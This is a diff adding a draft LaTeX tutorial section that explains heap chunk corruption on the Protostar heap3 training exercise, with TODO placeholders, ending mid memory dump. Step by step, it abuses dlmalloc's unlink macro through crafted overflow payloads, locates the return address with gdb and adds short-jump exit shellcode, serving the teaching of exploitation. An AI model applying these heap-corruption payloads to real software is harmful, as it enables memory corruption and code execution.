@@ -1,0 +1,672 @@
+\subsection{Chunk Corruption}
+While we are still able to overflow the programmer's variables and
+buffers, the new avenue of attack is in the metadata used by the
+dlmalloc/ptmalloc algorithm. Various pieces of information - size,
+linked list pointers, bitflags - can be overwritten to allow for
+dlmalloc/ptmalloc to do unexpected things, such as overwrite 
+arbitrary portions of memory. However, this can be fairly 
+complicated and involved. Please note that in this example, while
+we are still essentially attacking a standard glibc implementation of dlmalloc,
+the authors from \texttt{exploit-exercises.com} have somewhat simplified it.
+This specific program is statically compiled with some slightly modified
+glibc code, removing sanity and security checks which would otherwise
+make exploitation very difficult. While this makes it easier to illustrate
+the point, we lose relevance to modern heap corruption attacks, which are
+even more complicated.
+
+\lstinputlisting[language=C]{heap/heap3.c}
+
+Initially, this program doesn't appear to be exploitable. Although
+we do have buffer overflows from the 3 \texttt{strcpy()} calls on
+lines 20, 21 and 22, none of the programmer's variables are really
+important, and it's not even clear if we could overflow all the
+way from the heap to the return pointer on the stack. However,
+we can overflow the \texttt{size} and \texttt{prev\_size} fields
+in two of these three malloc chunks. The trick is in overflowing
+them with the right values. For example, consider the following
+output from some exploratory overflowing:
+
+\begin{lstlisting}
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("A"*40)'` fdsa asdf
+Segmentation fault
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("B"*40)'` fdsa asdf
+dynamite failed?
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("C"*40)'` fdsa asdf
+dynamite failed?
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("D"*40)'` fdsa asdf
+Segmentation fault
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("E"*40)'` fdsa asdf
+Segmentation fault
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("F"*40)'` fdsa asdf
+dynamite failed?
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("G"*40)'` fdsa asdf
+dynamite failed?
+user@protostar:~/heap/heap3$ /opt/protostar/bin/heap3 `python -c 'print("H"*40)'` fdsa asdf
+Segmentation fault
+\end{lstlisting}
+
+With buffers of 40 bytes, we're certainly overflowing chunk \texttt{b}'s
+\texttt{size} field, leading to unexpected behavior within our call to free.
+However, interestingly only certain values will cause us to crash with a segfault,
+while other values seem to have no effect. This is specifically because of 
+some indicator bits encoded within the size field, and how they affect execution
+of dlmalloc's various subroutines. Because of this, and many other things, we will
+need to have a brief overview of some specific parts of glibc's dlmalloc implementation.\\
+
+TODO: go over various things here as glibc dlmalloc primer. may want to move this elsewhere?
+\begin{itemize}
+	\item chunk structure \& fields (prev\_size, size, FD, BK)
+	\item free algorithm
+	\item unlink macro (macro abuse)
+\end{itemize}
+
+%at this point, we should have just enough backgound in dlmalloc to follow the exploit.
+
+So, we at least know enough about dlmalloc to exploit this program. Recalling
+that we have the power to overflow chunks \texttt{b} and \texttt{c}, how
+could we modify values to get what we want? For maximum satisfaction, at this 
+point you should study glibc source code and phrack articles to independently
+discover the solution. If you're willing to spoil your own fun, continue reading.
+The most obvious and straightforward 
+method (in this case) will be to make clever use of the unlink macro. Though
+fairly complicated for a macro, we can isolate the important parts of it for study,
+especially if we ignore the security checks which will not be present in this example.
+
+\lstinputlisting[language=C]{heap/unlink_macro_excerpt}
+
+This is a standard routine to unlink some node from a doubly-linked list.
+To see how we could abuse this, let's step through it. First, the 
+\texttt{FD} and \texttt{BK} variables are set to the chunks forward of and
+back from chunk \texttt{P} in the circularly linked listed of currently
+free chunks. This is expected, as these are the chunks whose pointers
+will need to be modified to remove \texttt{P} from the list. In fact,
+this is exactly what happens at lines \texttt{6} and \texttt{7}, when
+either chunk's location is written in the other's appropriate pointer.
+But wait a minute, each chunk here (\texttt{P}, \texttt{FD}, \texttt{BK})
+is basically a \texttt{struct malloc\_chunk}. As we discussed earlier,
+this structure's \texttt{fd} and \texttt{bk} \texttt{malloc\_chunk*}
+fields are located (in our specific case) at \texttt{P+8} and 
+\texttt{P+12} respectively, assuming we focus on chunk \texttt{P} as an example.
+So, we can think of the two assignments on lines \texttt{6} and \texttt{7}
+as:
+\begin{lstlisting}
+*(&FD+12) = &BK
+*(&BK+8) = &FD
+\end{lstlisting}
+In fact, the corresponding machine code will look something like this:
+
+\lstinputlisting[]{heap/unlink_macro_excerpt_assembly}
+
+To be explicit, \texttt{-0x14(\%ebp)} is essentially \texttt{FD}, and
+\texttt{-0x18(\%ebp)} is \texttt{BK}. The first two lines move them into
+\texttt{\%eax} and \texttt{\%edx}, respectively, then on line 3,
+\texttt{mov \%edx,0xc(\%eax)} performs \texttt{FD->bk = BK}. Likewise,
+lines 4-6 together perform \texttt{BK->fd = FD}. The potential for
+abuse comes in when the attacker somehow manages to control
+the chunk \texttt{P}'s \texttt{fd} and \texttt{bk} fields, which 
+gives the attacker control of the \texttt{FD} and \texttt{BK} variables,
+which in turn will give the attacker control of where the values
+of \texttt{FD} and \texttt{BK} are written later. This gives us
+the potential to overwrite an almost arbitrary consecutive four bytes
+in memory, under certain restrictions. For example, as the values written
+to both addresses are also addresses themselves, both values we
+write must also be addresses which are currently writeable in the process.
+Though we will typically focus on only using one of the variables
+for the target of our overwrite, we have to remember that two
+writes will occur based on the values of \texttt{fd} and \texttt{bk}.
+
+Now, this seems to be begging the question. If we could overwrite memory
+to give \texttt{P->fd} and \texttt{P->bk} specific values, wouldn't
+we already have the level of access we want? Well, remember, \texttt{P}
+is just whatever chunk the dlmalloc group of algorithms decides should
+be unlinked from a list of free chunks. Since our program is vulnerable
+to a buffer overflow, we can not only overflow two separate chunks
+\texttt{b} and \texttt{c} which may possibly be unlinked later, but we can also
+overflow the locations of their \texttt{fd} and \texttt{bk} fields. The
+only hurdle left would be getting one of these chunks to operated
+on by the \texttt{unlink} macro.
+
+Going back to the dlmalloc algorithms (specifically, \texttt{free} and \texttt{malloc})
+we see that there are certain circumstances that would cause a free chunk
+to be unlinked, such as if it were reappropriated by \texttt{malloc} for
+use, or if it were coalesced with an adjacent free chunk by \texttt{free}.
+Within our example however, we don't seem to be able to encounter either
+of these situations. Once we overflow our chunks, no more \texttt{malloc}
+calls are made, and it's not clear that any of our chunks will be
+automatically coalesced when they are freed. It would be nice if we could
+force execution of the \texttt{unlink} macro instead of hoping one
+occurs naturally. In fact, this is not only possible, but is an important
+part of exploiting this program.
+
+When a chunk is freed, the \texttt{free} algorithm will check if 
+contiguous chunks are in use, in order to coalesce them to reduce 
+heap fragmentation. In this situation, multiple free chunks are
+combined into one larger free chunk, which necessitates a call
+to \texttt{unlink} in order to remove chunk(s) which no longer exist.
+We do have three calls to \texttt{free} after our overflows, so this
+seems like it may be useful. The only question is how we could force
+this to happen. Well, in order for adjacent chunks to be coalesced
+with whatever chunk we're freeing, they must not be in use. As covered
+earlier, this is determined by the least-significant bit in the chunk's
+\texttt{size} field. Borrowing from comments in the glibc source:
+
+\begin{lstlisting}
+...
+The size fields also hold bits representing whether chunks are free or
+in use.
+     chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+		         |             Size of previous chunk, if allocated            | |
+		         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+		         |             Size of chunk, in bytes                       |M|P|
+		   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+						 |                                                               |
+...
+The P (PREV_INUSE) bit, stored in the unused low-order bit of the
+chunk size (which is always a multiple of two words), is an in-use
+bit for the *previous* chunk.  If that bit is *clear*, then the
+word before the current chunk size contains the previous chunk
+size, and can be used to find the front of the previous chunk.
+...
+\end{lstlisting}
+
+It seems a bit confusing when precisely the \texttt{prev\_size} field will be used,
+but the important part here is after the diagram: 
+``If that bit is *clear*, then the word before the current chunk size contains the previous chunk
+size, and can be used to find the front of the previous chunk." This is further illustrated
+by the \texttt{prev\_inuse(p)} macro:
+
+\begin{lstlisting}
+/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
+#define PREV_INUSE 0x1
+
+/* extract inuse bit of previous chunk */
+#define prev_inuse(p)       ((p)->size & PREV_INUSE)
+\end{lstlisting}
+
+Now, to tie this all together into our technique to force an execution
+of the \texttt{unlink} macro. Let's focus on the first chunk we overflow,
+chunk \texttt{b}, with the goal of overwriting it such that, when it is
+freed, it forces an \texttt{unlink} to be performed. To do this, we'll
+need to trick \texttt{free} into thinking some adjacent chunk is
+not in use. Consider what would happen if we overwrote \texttt{b}'s
+header such that the \texttt{PREV\_INUSE} bit of \texttt{size}
+were clear. In order to coalesce this previous (contiguously) chunk,
+\texttt{free} would subtract \texttt{prev\_size} from \texttt{p},
+the chunk being freed, in order to access the previous chunk's header.
+However, not only can we not control chunk \texttt{a}'s header, but
+chunk \texttt{b}'s \texttt{prev\_size} field was never properly
+initialized, and is being overwritten anyways, so supplying a
+value for \texttt{prev\_size} is a necessary opportunity. Let's
+take advantage of it and carefully select a \texttt{prev\_size}
+value to write in order to point \texttt{free} to a fake chunk of
+our crafting.
+
+\begin{lstlisting}
+/* consolidate backward */
+if (!prev_inuse(p)) {
+	prevsize = p->prev_size;
+	size += prevsize;
+	p = chunk_at_offset(p, -((long) prevsize));
+	unlink(p, bck, fwd);
+}
+\end{lstlisting}
+
+We could choose many values. For example, a small but positive \texttt{prev\_size}
+would put the fake chunk somewhere in chunk \texttt{a}'s data portion.
+However, we cannot write null bytes with our overflow, so at the very least
+some positive \texttt{prev\_size} would certainly be very large (it is a 4-byte integer).
+Instead, we could take advantage of two's complement, give \texttt{prev\_size} a negative value, and place our
+fake chunk within chunk \texttt{b}'s data portion. For example,
+overwriting \texttt{prev\_size} with \texttt{0xfffffffc} (-4) would
+place the fake chunk at \texttt{\&p + 0x4}, meaning that the fake chunk's
+forward and back pointers will be at \texttt{\&p + 0x0c} and \texttt{\&p + 0x10}.
+
+Assuming we wanted to overwrite the 4 bytes beginning at address \texttt{A} with
+some value \texttt{B}, we'd have to do the following to properly set up our
+buffer. First, we'll overwrite chunk \texttt{b}'s \texttt{prev\_size} field with
+-4, overwrite \texttt{b}'s \texttt{size} field with some value whose low-order bit
+is clear (-4 would work here as well), then, pad with 4 bytes of our choice. This
+overwrites chunk \texttt{b}'s header, and gets us up to \texttt{\&b + 0xc}, where
+we will put our fake chunk's \texttt{fd} pointer. Arbitrarily deciding to use this pointer
+to indicate the target's position, we have some simple math to do. Since \texttt{A}
+is the location we want to overwrite, and we're using the forward pointer
+to do so, we'll need to compensate for the indexing that's done in \texttt{unlink}.
+Essentially, we want \texttt{\&(FD->bk) == A}, which means we need \texttt{FD+0xc == A}.
+Simple algebra then gives that \texttt{FD == A - 0xc}, so we'll want to take the
+desired target, \texttt{A}, and place the bytes of \texttt{(long)(A - 0xc)} in our
+buffer. Since the \texttt{unlink} macro will directly place \texttt{BK} here,
+well then place the bytes of \texttt{(long)B} immediately after this, where our fake
+chunk's \texttt{bk} field would be. Throughout this entire process, we
+need to remember that our values of \texttt{A} and \texttt{B} are limited to
+be within writeable pages of memory. Also, when constructing the buffer, we need
+to conform to the architecture's endianness, which in this case is little-endian.
+
+Alright, enough planning and theory, let's try this out. First, let's inspect
+precisely how our chunks are laid out in memory. First, we place a breakpoint 
+immediately after the calls to malloc so we can see where our chunks are allocated
+(edited slightly for brevity):
+
+\begin{lstlisting}
+0x08048892 <main+9>:    movl   $0x20,(%esp)
+0x08048899 <main+16>:   call   0x8048ff2 <malloc>
+0x0804889e <main+21>:   mov    %eax,0x14(%esp)
+0x080488a2 <main+25>:   movl   $0x20,(%esp)
+0x080488a9 <main+32>:   call   0x8048ff2 <malloc>
+0x080488ae <main+37>:   mov    %eax,0x18(%esp)
+0x080488b2 <main+41>:   movl   $0x20,(%esp)
+0x080488b9 <main+48>:   call   0x8048ff2 <malloc>
+0x080488be <main+53>:   mov    %eax,0x1c(%esp)
+(gdb) b *(main+21)
+Breakpoint 2 at 0x804889e: file heap3/heap3.c, line 16.
+(gdb) b *(main+37)
+Breakpoint 3 at 0x80488ae: file heap3/heap3.c, line 17.
+(gdb) b *(main+53)
+Breakpoint 4 at 0x80488be: file heap3/heap3.c, line 18.
+(gdb) r AAAA BBBB CCCC
+Breakpoint 2, 0x0804889e in main (argc=4, argv=0xbffff854) at heap3/heap3.c:16
+16      in heap3/heap3.c
+(gdb) i r eax
+eax            0x804c008        134529032
+(gdb) c
+Continuing.
+Breakpoint 3, 0x080488ae in main (argc=4, argv=0xbffff854) at heap3/heap3.c:17
+17      in heap3/heap3.c
+(gdb) i r eax
+eax            0x804c030        134529072
+(gdb) c
+Continuing.
+Breakpoint 4, 0x080488be in main (argc=4, argv=0xbffff854) at heap3/heap3.c:18
+18      in heap3/heap3.c
+(gdb) i r eax
+eax            0x804c058        134529112
+\end{lstlisting}
+So, our chunks are allocated consecutively at \texttt{0x804c008}, \texttt{0x804c030} and \texttt{0x804c058}.
+Now, let's take a look at their state after they've been filled with simple input.
+stopping on a breakpoint after the last call to strcpy, we have:
+
+\begin{lstlisting}
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
+0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
+0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+\end{lstlisting}
+
+Here, we automatically subtracted \texttt{0x8} from our first chunk's address so
+we can see its header. As expected, at the 3 addresses returned from \texttt{malloc},
+we have our data (the \texttt{0x41}, \texttt{0x42}, \texttt{0x43} bytes). Also
+as expected, we have the \texttt{size} fields of our three chunks (the \texttt{0x00000029} integers)
+all with their \texttt{PREV\_INUSE} bits set. The 8 bytes towards the end of our
+memory dump belong to the ``top" chunk, which we won't concern ourselves with
+for this example. Alright, let's try out the first portion of our exploit: forcing
+execution of the \texttt{unlink} macro.
+
+\begin{lstlisting}
+(gdb) d b
+Delete all breakpoints? (y or n) y
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` A B
+Program received signal SIGSEGV, Segmentation fault.
+0x080498fd in free (mem=0x804c030) at common/malloc.c:3638
+(gdb) i r
+eax            0x0      0
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd7ff4       -1208123404
+esp            0xbffff710       0xbffff710
+ebp            0xbffff758       0xbffff758
+esi            0x0      0
+edi            0x0      0
+eip            0x80498fd        0x80498fd <free+217>
+eflags         0x210202 [ IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) disas $eip
+Dump of assembler code for function free:
+0x08049824 <free+0>:    push   %ebp
+0x08049825 <free+1>:    mov    %esp,%ebp
+...
+0x080498f4 <free+208>:  mov    %eax,-0x18(%ebp)
+0x080498f7 <free+211>:  mov    -0x14(%ebp),%eax
+0x080498fa <free+214>:  mov    -0x18(%ebp),%edx
+0x080498fd <free+217>:  mov    %edx,0xc(%eax)
+0x08049900 <free+220>:  mov    -0x18(%ebp),%eax
+0x08049903 <free+223>:  mov    -0x14(%ebp),%edx
+0x08049906 <free+226>:  mov    %edx,0x8(%eax)
+...
+\end{lstlisting}
+
+Excellent! We broke something badly enough to cause a segfault! It doesn't take much
+to see why either. Checking our registers, then disassembling where the instruction
+pointer was at tells us we crashed in our \texttt{unlink} macro because \texttt{\%eax}
+was null when we tried to perform \texttt{FD->bk = BK} (\texttt{mov \%edx,0xc(\%eax)}).
+This is easy enough to see, since we overwrote chunk \texttt{b}'s \texttt{prev\_size}
+and \texttt{size} fields with -4, which forces \texttt{unlink} to process a fake chunk
+within chunk \texttt{b}. because we only filled \texttt{b} with the single byte representing
+``A", the fake chunk's \texttt{fd} and \texttt{bk} pointers were obviously null, leading to the crash.
+
+Now, let's load values into the \texttt{fd} and \texttt{bk} pointers of our fake chunk.
+As covered previously, we expect these to be at \texttt{\&b + 0xc} and \texttt{\&b + 0x10}.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"A"*4+"B"*4)'` C
+Program received signal SIGSEGV, Segmentation fault.
+0x080498fd in free (mem=0x804c030) at common/malloc.c:3638
+(gdb) i r eip
+eip            0x80498fd        0x80498fd <free+217>
+(gdb) i r eax
+eax            0x41414141       1094795585
+(gdb) i r edx
+edx            0x42424242       1111638594
+\end{lstlisting}
+
+So, we've crashed in exactly the same location, but now we've pinned down the exact
+locations that \texttt{FD} and \texttt{BK} are loaded from. For clarity, we'll run
+the program again, but examine how all our chunks are set up immediately after the
+calls to \texttt{strcpy}.
+
+\begin{lstlisting}
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
+0x804c030:      0xf0f0f0f0      0x41414141      0x42424242      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000029      0x00000043      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+\end{lstlisting}
+
+As we can see (especially when comparing with the previous dump of such memory from
+a ``clean" execution), we've corrupted \texttt{b}'s header, and placed a fake chunk
+at \texttt{\&b+0x4}. Now, let's try doing something with \texttt{unlink} besides segfaulting
+our program. For example, let's try changing a few bytes within \texttt{a}'s data portion.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"*4)'` C
+dynamite failed?
+
+Program exited with code 021.
+\end{lstlisting}
+
+No segfault! now we'll breakpoint after each of our 3 calls to \texttt{free}
+to see how things change.
+
+\begin{lstlisting}
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
+0x804c030:      0xf0f0f0f0      0x0804c004      0x0804c004      0x0804c004
+0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+(gdb) c
+Continuing.
+
+Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
+26      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x0804c004
+0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
+0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+(gdb) c
+Continuing.
+
+Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
+28      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x00000000      0x0804c004
+0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
+0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+\end{lstlisting}
+
+Since the chunks are freed in reverse order, we expect the first free to
+behave normally, the second free to trigger the arbitrary memory write,
+and the third free to behave normally.
+Here, we gave \texttt{FD} and \texttt{BK} both values of \texttt{0x0804c004},
+so we expect this value to be written to both \texttt{0x0804c004 + 0x8} and \texttt{0x0804c004+0xc}.
+As expected, we can see that both \texttt{0x0804c00c} and \texttt{0x0804c010} have
+been changed from \texttt{0x41414141} to \texttt{0x0804c004} during our second
+call to \texttt{free} (the second memory dump). We can also notice some other
+side-affects from abusing dlmalloc like this. During the second call to \texttt{free},
+our fake chunk's been processed further, and appears to contain calculated
+\texttt{size}, \texttt{fd} and \texttt{bk} fields. Since this doesn't seem to negatively
+affect exploitation, I've ignored it and not bothered to find out precisely
+where it comes from, though it wouldn't be hard to discover.
+We can also control where our two values are written with more precision. Let's compare
+exploiting with the previous buffer, and with one where \texttt{FD} and \texttt{BK}
+are given different values. Again, we've edited for brevity and clarity.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"*4)'` C
+Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
+26      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x0804c004
+0x804c010:      0x0804c004      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x0804c004
+0x804c040:      0x0804c004      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x0c\xc0\x04\x08")'` C
+Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
+26      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x0804c00c      0x0804c004      0x41414141      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x10\xc0\x04\x08")'` C
+Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
+26      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x0804c010      0x41414141      0x0804c004      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
+0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
+\end{lstlisting}
+
+Alright, so we can clearly control this arbitrary memory write with precision. Now,
+how do we exploit this? what do we overwrite to exploit the program? In reality,
+this may heavily depend on the target program. In some cases we may only want
+to flip a bit to set a flag or change some other variable in memory, but
+a more devastating option is to redirect execution. While we could
+potentially overwrite any function pointer in writeable memory (.dtors, .got, etc...)
+a more familiar option would be to overwrite the return address on the stack.
+Now that we have our target, we need to pick what to set it to.
+Because this must also be an address in writeable memory, we have some restrictions.
+For example, we can't redirect execution to some function in .data because it's
+read-only. Redirecting to some library function in the Global Offset Table (.got)
+could be possible, but we'd normally have to set up variables on the stack
+to do anything useful with that. Instead, we'll redirect execution back
+into the heap, which is mapped as both writeable and executable.
+
+TODO: insert objdump/readelf/whatever output here to show this is true
+
+First, we'll find our return address. This is similar to the stack portion, where
+we simply breakpoint somewhere in main, then examine the stack to determine where
+this is. Because various bits of libc code are executed before we even get to
+\texttt{main}, we need to remember that changing number and size of arguments
+given to the program can change precisely where \texttt{main}'s stack is. Since we
+want to redirect execution to the heap, we'll fill chunk \texttt{c} with bytes,
+as if we put shellcode there. That way the return address location we determine 
+won't change once we move from overwriting it to developing the payload shellcode.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x5c\xc0\x04\x08")'` `python -c 'print("\x90"*32)'`
+Breakpoint 12, 0x080488d2 in main (argc=4, argv=0xbffff804) at heap3/heap3.c:20
+20      in heap3/heap3.c
+(gdb) x/16x $ebp
+0xbffff758:     0xbffff7d8      0xb7eadc76      0x00000004      0xbffff804
+0xbffff768:     0xbffff818      0xb7fe1848      0xbffff7c0      0xffffffff
+0xbffff778:     0xb7ffeff4      0x08048576      0x00000001      0xbffff7c0
+0xbffff788:     0xb7ff0626      0xb7fffab0      0xb7fe1b28      0xb7fd7ff4
+\end{lstlisting}
+
+Here we see \texttt{argc} (0x00000004), and know that at this point the return
+address is at \texttt{ebp + 0x4}, so our return address is the \texttt{0xb7eadc76}
+at \texttt{0xbffff75c}. So, we'll want to set \texttt{FD} to \texttt{0xbffff750}.
+To redirect to chunk \texttt{c}, we'll set \texttt{BK} to \texttt{0x0804c058}.
+Let's try it.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\x90"*32)'`
+dynamite failed?
+
+Program received signal SIGFPE, Arithmetic exception.
+0x0804c065 in ?? ()
+(gdb) x/16x 0x0804c050
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x90909090
+0x804c060:      0x90909090      0xbffff750      0x90909090      0x90909090
+0x804c070:      0x90909090      0x90909090      0x00000000      0x00000f89
+0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
+\end{lstlisting}
+
+Excellent! We filled chunk \texttt{c} with NOPs, but any non-null value would've worked.
+As we can see, we crash with a SIGFPE exception at \texttt{0x0804c065}. This address is
+on the heap, just a few bytes after the beginning of chunk \texttt{c}. Then, we examine
+chunk \texttt{c} to see exactly what happened. Our NOPs were loaded (and executed) just
+fine, but trouble starts where we crashed (unsurprisingly). Our NOP sled was corrupted
+by \texttt{0xbffff750}, the very address we overwrote! Here we encounter one of the
+final hurdles to succesfull exploitation. Because we used the unlink macro, it will
+perform two writes, one of which will always be in our shellcode (assuming that's what
+we're redirecting execution to). No matter what we do, we'll have 4 bytes of our shellcode,
+starting either 8 bytes in or 12 bytes in, clobbered. We could write our shellcode
+here after the arbitrary memory write in \texttt{unlink}, but this simply isn't
+an option in this situation. Instead, we'll have to modify the shellcode to
+short-jump over this corruption, or perform some other trick so we at least
+don't crash.
+
+The shellcode we're using is essentially the \texttt{exit(42)} shellcode from earlier,
+but with a short jump in the beginning, and some unused bytes between it and the
+main portion of the shellcode. Also, we want have to consider that as part
+of the frees that occur, the first 4 bytes of chunk \texttt{c} will be zeroed, and
+we want to maintain filling chunk \texttt{c} with exactly 32 bytes. That way we
+don't have to go back and re-find the return address' location on the stack.
+
+
+TODO: add a shellcode section?
+
+\begin{lstlisting}
+"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"
+\end{lstlisting}
+
+The large stream of \texttt{0x90} bytes is simply so we can be sure our short jump
+will indeed jump over the corruption from \texttt{unlink}. We'll wind up having
+more bytes here than strictly necessary, but we're still well within the limits on
+our chunk. Also, since this is 24 bytes long, and we'll pad with 4 bytes in the beginning,
+we'll pad with 4 bytes on the end of this to satisfy filling chunk \texttt{c} with
+32 bytes (24 + 4 + 4 = 32). Alright, let's set up this last portion of our
+buffer and try it out.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\xf0"*4+"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"+"\x90"*4)'`
+Breakpoint 1, main (argc=4, argv=0xbffff804) at heap3/heap3.c:24
+24      heap3/heap3.c: No such file or directory.
+        in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
